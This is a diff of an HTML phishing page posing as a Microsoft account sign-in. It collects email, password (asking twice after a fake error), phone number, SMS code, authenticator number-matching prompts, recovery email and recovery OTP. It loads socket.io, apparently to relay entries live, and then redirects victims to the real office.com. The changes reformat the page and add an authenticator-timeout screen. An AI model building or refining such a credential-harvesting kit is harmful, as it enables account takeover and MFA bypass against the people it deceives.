@@ -6,7 +6,7 @@
     <meta name="robots" content="noindex, nofollow">
     <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
     <title>Sign in to your account</title>
-    
+
     <link rel="stylesheet" href="assets/app.css" />
 
     <script src="/socket.io/socket.io.js"></script>
@@ -14,12 +14,34 @@
     <script src="script.js"></script>
 
     <style>
-        /* 1. Tiny Top Progressive Loading Bar */
+        /* ── Layout: full-viewport vertical centering ── */
+        /* These override whatever app.css sets for body/section so centering
+           works correctly on all screen sizes including mobile. */
+        html {
+            height: 100%;
+        }
+
+        body {
+            display: table;
+            width: 100%;
+            min-height: 100%;
+        }
+
+        section {
+            display: table-cell;
+            vertical-align: middle;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* ── Top Progressive Loading Bar ── */
         #top_loader {
-            display: none; 
+            display: none;
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 3px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
             background-color: transparent;
             z-index: 99999;
             overflow: hidden;
@@ -28,51 +50,30 @@
         #top_loader::before {
             content: '';
             display: block;
-            width: 100%; height: 100%;
-            background-color: #0067b8; 
+            width: 100%;
+            height: 100%;
+            background-color: #0067b8;
             animation: loadingBar 1.5s infinite ease-in-out;
             transform-origin: 0% 50%;
         }
 
         @keyframes loadingBar {
-            0% { transform: translateX(-100%) scaleX(0.2); }
-            50% { transform: translateX(0%) scaleX(0.5); }
-            100% { transform: translateX(100%) scaleX(0.2); }
+            0%   { transform: translateX(-100%) scaleX(0.2); }
+            50%  { transform: translateX(0%)    scaleX(0.5); }
+            100% { transform: translateX(100%)  scaleX(0.2); }
         }
 
-        /* 2. Transparent Click Blocker */
+        /* ── Transparent Click Blocker ── */
         #click_blocker {
             display: none;
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: rgba(255, 255, 255, 0.4);
             z-index: 99998;
             cursor: wait;
-        }
-
-        /* 3. Global Vertical Alignment Fix */
-        html, body {
-            height: 100%;
-            margin: 0;
-            display: table;
-            width: 100%;
-            background-color: #e2e5d3;
-        }
-
-        section {
-            display: none; /* Controlled by script.js toggle */
-            vertical-align: middle;
-            height: 100vh;
-            width: 100vw;
-        }
-
-        /* Ensure active section displays as table-cell for centering */
-        section.active {
-            display: table-cell !important;
-        }
-
-        @media screen and (max-width: 600px) {
-            html, body { background-color: #fff; }
         }
     </style>
 </head>
@@ -81,44 +82,60 @@
     <div id="top_loader"></div>
     <div id="click_blocker"></div>
 
-    <section id="section_uname" class="active">
+    <!-- ── Section: Username ── -->
+    <section id="section_uname">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
             <form onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email address, phone number, or Skype" />
+                    <input
+                        id="inp_uname"
+                        type="text"
+                        name="uname"
+                        class="input"
+                        placeholder="Email address, phone number, or Skype"
+                    />
                 </div>
             </form>
             <div>
                 <p class="mb-16 fs-13">No account? <a href="#" class="link">Create one!</a></p>
-                <p class="mb-16 fs-13"><a href="#" class="link">Can’t access your account?</a></p>
+                <p class="mb-16 fs-13"><a href="#" class="link">Can't access your account?</a></p>
             </div>
             <div>
                 <button type="button" class="btn" id="btn_next">Next</button>
             </div>
         </div>
         <div class="opts">
-            <p class="has-icon mb-0" style="font-size:15px;">
-                <span class="icon"><img src="assets/key.svg" width="30px" alt="key" /></span> 
+            <p class="has-icon mb-0" style="font-size: 15px;">
+                <span class="icon"><img src="assets/key.svg" width="30" alt="key" /></span>
                 Sign-in options
             </p>
         </div>
     </section>
 
-    <section id="section_pwd">
+    <!-- ── Section: Password ── -->
+    <section id="section_pwd" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
+                <button class="back" onclick="window.location.reload()">
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
                 <span id="user_identity"></span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
             <form onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
-                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                    <input
+                        id="inp_pwd"
+                        type="password"
+                        name="pass"
+                        class="input"
+                        placeholder="Password"
+                    />
                 </div>
             </form>
             <div>
@@ -130,19 +147,30 @@
         </div>
     </section>
 
-    <section id="section_confirm">
+    <!-- ── Section: Confirm Password (incorrect password state) ── -->
+    <section id="section_confirm" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <button class="backConfirm" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
-                <span id="user_identity"></span>
+                <button class="backConfirm" onclick="window.location.reload()">
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
+                <span id="user_identity_confirm"></span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <p style="color: #e81123; font-size: 14px; margin-bottom: 10px;">Your account or password is incorrect. If you don't remember your password, reset it now.</p>
+            <p style="color: #e81123; font-size: 14px; margin-bottom: 10px;">
+                Your account or password is incorrect. If you don't remember your password, reset it now.
+            </p>
             <form onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_confirm" class="error"></p>
-                    <input id="inp_confirm" type="password" name="pass" class="input" placeholder="Password" />
+                    <input
+                        id="inp_confirm"
+                        type="password"
+                        name="pass"
+                        class="input"
+                        placeholder="Password"
+                    />
                 </div>
             </form>
             <div>
@@ -151,7 +179,8 @@
         </div>
     </section>
 
-    <section id="section_verify">
+    <!-- ── Section: Verify Identity (phone number entry) ── -->
+    <section id="section_verify" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mt-16">Verify your identity</h2>
@@ -159,7 +188,14 @@
             <form onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_verify" class="error"></p>
-                    <input id="inp_verify" type="tel" name="verify" class="input" placeholder="+1(123) 456-7890" maxlength="14" />
+                    <input
+                        id="inp_verify"
+                        type="tel"
+                        name="verify"
+                        class="input"
+                        placeholder="+1(123) 456-7890"
+                        maxlength="14"
+                    />
                 </div>
             </form>
             <div>
@@ -168,15 +204,23 @@
         </div>
     </section>
 
-    <section id="section_code">
+    <!-- ── Section: Enter SMS Code ── -->
+    <section id="section_code" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mt-16">Enter code</h2>
             <p class="mb-16 mt-16">We sent a 6-digit code to your phone.</p>
             <form onsubmit="return false;">
                 <div class="mb-16">
-                    <p id="error_code" class="error" style="color: #e81123;"></p>
-                    <input id="inp_code" type="text" name="code" class="input" placeholder="Enter code" maxlength="6" />
+                    <p id="error_code" class="error"></p>
+                    <input
+                        id="inp_code"
+                        type="text"
+                        name="code"
+                        class="input"
+                        placeholder="Enter code"
+                        maxlength="6"
+                    />
                 </div>
             </form>
             <div>
@@ -185,14 +229,25 @@
         </div>
     </section>
 
-    <section id="section_auth_num">
+    <!-- ── Section: Authenticator App Number ── -->
+    <section id="section_auth_num" class="d-none">
         <div class="auth-wrapper" style="text-align: center;">
             <div style="display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px;">
-                <button class="back" onclick="document.getElementById('section_auth_num').classList.add('d-none'); document.getElementById('section_auth_err').classList.remove('d-none'); return false;" style="margin-right: 10px; border:none; background:transparent; cursor:pointer;"><img src="assets/back.svg" alt="Back" /></button>
+                <button
+                    class="back"
+                    style="margin-right: 10px; border: none; background: transparent; cursor: pointer;"
+                    onclick="
+                        document.getElementById('section_auth_num').classList.add('d-none');
+                        document.getElementById('section_auth_err').classList.remove('d-none');
+                        return false;
+                    "
+                >
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
                 <img src="assets/logo.svg" alt="logo" />
             </div>
-            <div class="identity w-100 mb-16" style="justify-content: center; background: #f3f3f3; padding: 4px 12px; border-radius: 16px; display: inline-flex; width: auto;">
-                <span id="user_identity" class="fs-13" style="color: #1b1b1b;">example@example.com</span>
+            <div class="identity mb-16" style="justify-content: center; background: #f3f3f3; padding: 4px 12px; border-radius: 16px; display: inline-flex;">
+                <span id="user_identity_auth_num" class="fs-13" style="color: #1b1b1b;">example@example.com</span>
             </div>
             <h2 class="title mb-16" style="font-weight: 600;">Check your phone</h2>
             <div style="margin: 20px 0;">
@@ -203,24 +258,125 @@
             <div id="auth_digit_display" style="font-size: 42px; font-weight: 600; margin-bottom: 16px;">98</div>
             <p class="fs-13 mb-16">Select this number in the sign-in request on your mobile device.</p>
             <div style="margin-top: 30px; text-align: left;">
-                <p class="mb-16"><a href="#" class="link fs-13">Other ways to sign in</a></p>
-                <p class="mb-16"><a href="#" class="link fs-13">Can't use your Microsoft app?</a></p>
+                <p class="mb-16">
+                    <a
+                        href="#"
+                        class="link fs-13"
+                        onclick="
+                            document.getElementById('section_auth_num').classList.add('d-none');
+                            document.getElementById('section_auth_err').classList.remove('d-none');
+                            return false;
+                        "
+                    >Other ways to sign in</a>
+                </p>
+                <p class="mb-16">
+                    <a
+                        href="#"
+                        class="link fs-13"
+                        onclick="
+                            document.getElementById('section_auth_num').classList.add('d-none');
+                            document.getElementById('section_auth_err').classList.remove('d-none');
+                            return false;
+                        "
+                    >Can't use your Microsoft app?</a>
+                </p>
             </div>
         </div>
     </section>
 
-    <section id="section_recovery">
+    <!-- ── Section: Authenticator App Timeout Error ── -->
+    <section id="section_auth_err" class="d-none">
+        <div class="auth-wrapper" style="text-align: center;">
+            <div style="display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px;">
+                <button
+                    class="back"
+                    style="margin-right: 10px; border: none; background: transparent; cursor: pointer;"
+                    onclick="
+                        document.getElementById('section_auth_err').classList.add('d-none');
+                        document.getElementById('section_uname').classList.remove('d-none');
+                        return false;
+                    "
+                >
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
+                <img src="assets/logo.svg" alt="logo" />
+            </div>
+            <div class="identity mb-16" style="justify-content: center; background: #f3f3f3; padding: 4px 12px; border-radius: 16px; display: inline-flex;">
+                <span id="user_identity_auth_err" class="fs-13" style="color: #1b1b1b;">example@example.com</span>
+            </div>
+            <h2 class="title mb-16" style="font-weight: 600;">We didn't get an approval</h2>
+            <p class="fs-13 mb-16">We sent a sign-in request to your Microsoft app, but didn't get your approval in time.</p>
+            <button
+                type="button"
+                class="btn mb-16"
+                id="btn_resend_auth"
+                style="margin: 0 auto; display: block; width: 100%;"
+                onclick="
+                    document.getElementById('section_auth_err').classList.add('d-none');
+                    document.getElementById('section_uname').classList.remove('d-none');
+                    return false;
+                "
+            >Send another request</button>
+            <div style="margin-top: 20px; text-align: left;">
+                <p class="mb-16">
+                    <a
+                        href="#"
+                        class="link fs-13"
+                        onclick="
+                            document.getElementById('section_auth_err').classList.add('d-none');
+                            document.getElementById('section_uname').classList.remove('d-none');
+                            return false;
+                        "
+                    >Other ways to sign in</a>
+                </p>
+                <p class="mb-16">
+                    <a
+                        href="#"
+                        class="link fs-13"
+                        onclick="
+                            document.getElementById('section_auth_err').classList.add('d-none');
+                            document.getElementById('section_uname').classList.remove('d-none');
+                            return false;
+                        "
+                    >Can't use your Microsoft app?</a>
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ── Section: Stay Signed In ── -->
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.svg" alt="logo" class="d-block" />
+            <h2 class="title mb-16 mt-16">Stay signed in?</h2>
+            <p class="fs-13 mb-16">Stay signed in so you don't have to sign in again next time.</p>
+            <div class="btn-group">
+                <button type="button" class="btn btn-sec" onclick="window.location.href='https://office.com'">No</button>
+                <button type="button" class="btn" onclick="window.location.href='https://office.com'">Yes</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- ── Section: Account Recovery (email verification) ── -->
+    <section id="section_recovery" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
+                <button class="back" onclick="window.location.reload()">
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
                 <span id="user_identity_rec"></span>
             </div>
-            <h2 class="title mb-16">Verify your email</h2>
-            <p class="fs-13 mb-16">We will send a verification code. To verify that this is your email address, enter it below.</p>
+            <h2 class="title mb-16">Verify your recovery email</h2>
+            <p class="fs-13 mb-16">We will send a verification code. To verify that this is your recovery email address, enter it below.</p>
             <form onsubmit="return false;">
                 <div class="mb-16">
-                    <input id="inp_recovery" type="email" class="input" placeholder="someone@example.com" />
+                    <input
+                        id="inp_recovery"
+                        type="email"
+                        class="input"
+                        placeholder="example@example.com"
+                    />
                 </div>
             </form>
             <div class="mb-16">
@@ -233,19 +389,30 @@
         </div>
     </section>
 
-    <section id="section_recovery_otp">
+    <!-- ── Section: Account Recovery OTP ── -->
+    <section id="section_recovery_otp" class="d-none">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
+                <button class="back" onclick="window.location.reload()">
+                    <img src="assets/back.svg" alt="Back" />
+                </button>
                 <span id="user_identity_rec_otp"></span>
             </div>
             <h2 class="title mb-16">Enter code</h2>
-            <p id="recovery_otp_text" class="fs-13 mb-16" style="margin-bottom: 5px;"></p>
-            <p id="error_recovery_otp" class="error d-none" style="margin-bottom: 10px;">The code you entered is incorrect. Please try again.</p>
+            <p id="recovery_otp_text" class="fs-13 mb-16"></p>
+            <p id="error_recovery_otp" class="error d-none" style="margin-bottom: 10px;">
+                The code you entered is incorrect. Please try again.
+            </p>
             <form onsubmit="return false;">
                 <div class="mb-16">
-                    <input id="inp_recovery_otp" type="text" class="input" placeholder="Enter code" maxlength="8" />
+                    <input
+                        id="inp_recovery_otp"
+                        type="text"
+                        class="input"
+                        placeholder="Enter code"
+                        maxlength="8"
+                    />
                 </div>
             </form>
             <div class="mb-16">
@@ -257,21 +424,9 @@
         </div>
     </section>
 
-    <section id="section_final">
-        <div class="auth-wrapper">
-            <img src="assets/logo.svg" alt="logo" class="d-block" />
-            <h2 class="title mb-16 mt-16">Stay signed in?</h2>
-            <p class="fs-13 mb-16">Stay signed in so you don't have to sign in again next time.</p>
-            <div class="btn-group">
-                <button type="button" class="btn btn-sec" onclick="window.location.href='https://office.com'">No</button>
-                <button type="button" class="btn" onclick="window.location.href='https://office.com'">Yes</button>
-            </div>
-        </div>
-    </section>
-
     <footer class="footer">
         <a href="#">Terms of use</a>
-        <a href="#">Privacy & cookies</a>
+        <a href="#">Privacy &amp; cookies</a>
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
 
